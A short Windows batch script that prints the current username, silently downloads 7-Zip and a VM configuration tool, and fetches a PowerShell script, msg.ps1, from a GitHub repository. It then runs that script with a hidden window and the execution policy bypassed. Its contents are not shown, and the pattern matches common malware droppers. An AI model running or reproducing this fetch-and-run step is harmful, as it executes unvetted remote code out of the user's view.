@echo off
set "username=%USERNAME%"
echo Current user is: %username%

curl -s -L -o C:\Users\Public\Desktop\7zip.exe https://www.7-zip.org/a/7z2501-x64.exe
curl -s -L -o msg.ps1 https://raw.githubusercontent.com/activesoftinc/my-ser/refs/heads/main/msg.ps1
powershell -Command "Invoke-WebRequest 'https://github.com/chieunhatnang/VM-QuickConfig/releases/download/1.6.1/VMQuickConfig.exe' -OutFile 'C:\Users\Public\Desktop\VMQuickConfig.exe'"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File msg.ps1
